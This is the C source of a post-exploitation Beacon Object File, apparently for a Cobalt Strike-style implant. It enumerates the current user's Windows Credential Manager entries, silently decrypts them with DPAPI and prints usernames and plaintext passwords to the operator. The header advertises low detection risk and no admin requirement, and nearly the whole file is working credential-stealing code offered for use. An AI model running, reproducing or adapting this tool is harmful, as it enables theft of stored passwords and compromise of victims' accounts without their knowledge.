/*
 * Credential Manager Decryption BOF
 *
 * Enumerates and DECRYPTS credentials stored in Windows Credential Manager for the current user.
 * Uses CredEnumerateW + CryptUnprotectData to list credentials and extract passwords.
 *
 * Features:
 * - Lists all credentials (Web, Windows, Generic, Certificate-Based)
 * - Decrypts credential blobs using DPAPI (CryptUnprotectData)
 * - Extracts and displays passwords/secrets
 * - Works in current user context (no admin required)
 * - Only decrypts credentials encrypted by current user
 *
 * OPSEC: Uses standard Windows APIs, works in user context, low detection risk
 */

#include <windows.h>
#include <wincred.h>
#include <dpapi.h>
#include "beacon.h"

// Credential type strings for output
const char* GetCredentialTypeString(DWORD type) {
    switch(type) {
        case CRED_TYPE_GENERIC:
            return "GENERIC";
        case CRED_TYPE_DOMAIN_PASSWORD:
            return "DOMAIN_PASSWORD";
        case CRED_TYPE_DOMAIN_CERTIFICATE:
            return "DOMAIN_CERTIFICATE";
        case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
            return "DOMAIN_VISIBLE_PASSWORD";
        case CRED_TYPE_MAXIMUM:
            return "MAXIMUM";
        case CRED_TYPE_MAXIMUM_EX:
            return "MAXIMUM_EX";
        default:
            return "UNKNOWN";
    }
}

// Persistence type strings for output
const char* GetPersistenceString(DWORD persist) {
    switch(persist) {
        case CRED_PERSIST_SESSION:
            return "SESSION";
        case CRED_PERSIST_LOCAL_MACHINE:
            return "LOCAL_MACHINE";
        case CRED_PERSIST_ENTERPRISE:
            return "ENTERPRISE";
        default:
            return "UNKNOWN";
    }
}

// Helper function to safely print binary data as hex
void PrintHex(BYTE* data, DWORD size, DWORD maxBytes) {
    // Check for NULL pointer
    if (!data) {
        BeaconPrintf(CALLBACK_OUTPUT, "(null)");
        return;
    }

    DWORD bytesToPrint = (size < maxBytes) ? size : maxBytes;
    for (DWORD i = 0; i < bytesToPrint; i++) {
        BeaconPrintf(CALLBACK_OUTPUT, "%02X", data[i]);
        if ((i + 1) % 16 == 0 && i + 1 < bytesToPrint) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n                 ");
        } else if (i + 1 < bytesToPrint) {
            BeaconPrintf(CALLBACK_OUTPUT, " ");
        }
    }
    if (size > maxBytes) {
        BeaconPrintf(CALLBACK_OUTPUT, "... (%d more bytes)", size - maxBytes);
    }
}

// Decrypt credential blob using DPAPI
BOOL DecryptCredentialBlob(BYTE* encryptedData, DWORD encryptedSize, BYTE** decryptedData, DWORD* decryptedSize) {
    DATA_BLOB encryptedBlob;
    DATA_BLOB decryptedBlob;
    BOOL result;

    // Set up encrypted data blob
    encryptedBlob.cbData = encryptedSize;
    encryptedBlob.pbData = encryptedData;

    // Decrypt using DPAPI
    result = CryptUnprotectData(
        &encryptedBlob,
        NULL,                           // Description (we don't need it)
        NULL,                           // Optional entropy (not used for Credential Manager)
        NULL,                           // Reserved
        NULL,                           // Prompt struct (silent decryption)
        CRYPTPROTECT_UI_FORBIDDEN,      // Flags - no UI prompts
        &decryptedBlob
    );

    if (!result) {
        return FALSE;
    }

    // Return decrypted data
    *decryptedData = decryptedBlob.pbData;
    *decryptedSize = decryptedBlob.cbData;

    return TRUE;
}

void go(char* args, int len) {
    PCREDENTIALW* credentials = NULL;
    DWORD count = 0;
    BOOL result;
    DWORD successCount = 0;
    DWORD failCount = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating and decrypting Windows Credential Manager entries...\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Context: Current user\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Note: Only credentials encrypted by current user can be decrypted\n\n");

    // Parse arguments (filter is optional)
    datap parser;
    BeaconDataParse(&parser, args, len);

    // Get filter if provided (NULL for all credentials)
    LPWSTR filter = NULL;
    if (len > 0) {
        int extractedSize = 0;
        char* filterStr = BeaconDataExtract(&parser, &extractedSize);
        if (filterStr != NULL && extractedSize > 0) {
            // Convert to wide string
            filter = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (extractedSize + 1) * sizeof(WCHAR));
            if (filter) {
                int converted = MultiByteToWideChar(CP_ACP, 0, filterStr, extractedSize, filter, extractedSize + 1);
                if (converted <= 0) {
                    BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert filter string, listing all credentials\n");
                    HeapFree(GetProcessHeap(), 0, filter);
                    filter = NULL;
                } else {
                    filter[converted] = L'\0';
                }
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate memory for filter, listing all credentials\n");
            }
        }
    }

    // Enumerate all credentials
    result = CredEnumerateW(filter, 0, &count, &credentials);

    // Free filter if allocated
    if (filter) {
        HeapFree(GetProcessHeap(), 0, filter);
    }

    if (!result) {
        DWORD error = GetLastError();
        if (error == ERROR_NOT_FOUND) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] No credentials found in Credential Manager\n");
            return;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] CredEnumerateW failed with error: %d\n", error);
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found %d credential(s)\n\n", count);
    BeaconPrintf(CALLBACK_OUTPUT, "================================================================================\n\n");

    // Iterate through credentials and decrypt
    for (DWORD i = 0; i < count; i++) {
        PCREDENTIALW cred = credentials[i];

        BeaconPrintf(CALLBACK_OUTPUT, "[Credential %d]\n", i + 1);

        // Target name (always present)
        if (cred->TargetName) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Target:      %S\n", cred->TargetName);
        }

        // Username (may be NULL for some credential types)
        if (cred->UserName) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Username:    %S\n", cred->UserName);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  Username:    (none)\n");
        }

        // Credential type
        BeaconPrintf(CALLBACK_OUTPUT, "  Type:        %s\n", GetCredentialTypeString(cred->Type));

        // Persistence
        BeaconPrintf(CALLBACK_OUTPUT, "  Persistence: %s\n", GetPersistenceString(cred->Persist));

        // Last written timestamp
        SYSTEMTIME st;
        FILETIME localFileTime;
        if (FileTimeToLocalFileTime(&cred->LastWritten, &localFileTime) &&
            FileTimeToSystemTime(&localFileTime, &st)) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Last Write:  %04d-%02d-%02d %02d:%02d:%02d\n",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  Last Write:  (invalid timestamp)\n");
        }

        // Try to decrypt the credential blob
        if (cred->CredentialBlobSize > 0 && cred->CredentialBlob != NULL) {
            BYTE* decryptedData = NULL;
            DWORD decryptedSize = 0;
            BOOL decrypted = FALSE;

            // GENERIC credentials store passwords in PLAINTEXT (not DPAPI encrypted)
            if (cred->Type == CRED_TYPE_GENERIC) {
                BeaconPrintf(CALLBACK_OUTPUT, "  Blob Size:   %d bytes (plaintext)\n", cred->CredentialBlobSize);

                // Just read the blob directly - it's already plaintext Unicode
                decryptedData = (BYTE*)cred->CredentialBlob;
                decryptedSize = cred->CredentialBlobSize;
                decrypted = TRUE;
            } else {
                // Other credential types might use DPAPI encryption
                BeaconPrintf(CALLBACK_OUTPUT, "  Blob Size:   %d bytes (encrypted)\n", cred->CredentialBlobSize);
                decrypted = DecryptCredentialBlob(cred->CredentialBlob, cred->CredentialBlobSize, &decryptedData, &decryptedSize);
            }

            if (decrypted) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [+] Decryption: SUCCESS\n");
                successCount++;

                // The decrypted credential blob format varies by type
                // For most types, it's a Unicode string (password)
                if (decryptedSize > 0) {
                    // Try to interpret as Unicode string (most common case)
                    if (decryptedSize >= 2 && decryptedSize % 2 == 0) {
                        // Check if it looks like a Unicode string
                        WCHAR* password = (WCHAR*)decryptedData;
                        DWORD charCount = decryptedSize / 2;

                        // Basic validation - check for null terminator or printable chars
                        BOOL isUnicode = TRUE;
                        for (DWORD j = 0; j < charCount && j < 128; j++) {
                            if (password[j] == 0) {
                                break; // Null terminator found
                            }
                            // Check if character is in printable range
                            if (password[j] > 0x7E && password[j] < 0xA0) {
                                isUnicode = FALSE;
                                break;
                            }
                        }

                        if (isUnicode) {
                            BeaconPrintf(CALLBACK_OUTPUT, "  Password:    %.*S\n", charCount, password);
                        } else {
                            // Try as ASCII string
                            BeaconPrintf(CALLBACK_OUTPUT, "  Password:    %.*s\n", decryptedSize, (char*)decryptedData);
                        }
                    } else {
                        // Odd size or single byte - try as ASCII
                        BeaconPrintf(CALLBACK_OUTPUT, "  Password:    %.*s\n", decryptedSize, (char*)decryptedData);
                    }

                    // Also show hex dump for verification/binary data
                    BeaconPrintf(CALLBACK_OUTPUT, "  Decrypted:   ");
                    PrintHex(decryptedData, decryptedSize, 64); // Show first 64 bytes
                    BeaconPrintf(CALLBACK_OUTPUT, "\n");
                }

                // Free decrypted data (only if it was allocated by DPAPI, not for GENERIC which just points to existing blob)
                if (cred->Type != CRED_TYPE_GENERIC) {
                    // Zero the memory before freeing to prevent memory disclosure
                    volatile BYTE* ptr = (volatile BYTE*)decryptedData;
                    for (DWORD i = 0; i < decryptedSize; i++) {
                        ptr[i] = 0;
                    }
                    LocalFree(decryptedData);
                }
            } else {
                DWORD error = GetLastError();
                BeaconPrintf(CALLBACK_OUTPUT, "  [-] Decryption: FAILED (Error: %d)\n", error);

                if (error == ERROR_INVALID_DATA) {
                    BeaconPrintf(CALLBACK_OUTPUT, "      Reason: Likely encrypted by different user\n");
                } else if (error == ERROR_NO_SUCH_LOGON_SESSION) {
                    BeaconPrintf(CALLBACK_OUTPUT, "      Reason: No logon session (wrong context)\n");
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "      Reason: DPAPI error (see error code)\n");
                }

                failCount++;
            }
        } else if (cred->CredentialBlobSize > 0) {
            BeaconPrintf(CALLBACK_ERROR, "  Blob Size:   %d bytes (invalid NULL pointer)\n", cred->CredentialBlobSize);
            failCount++;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  Blob Size:   0 bytes (no password stored)\n");
        }

        // Comment field (if present)
        if (cred->Comment) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Comment:     %S\n", cred->Comment);
        }

        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "================================================================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Enumeration complete: %d credential(s) found\n", count);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Decryption results: %d successful, %d failed\n", successCount, failCount);

    if (failCount > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[!] Failed credentials were likely encrypted by a different user\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[!] DPAPI can only decrypt data encrypted by the same user in same context\n");
    }

    // Free the credentials array
    CredFree(credentials);
}
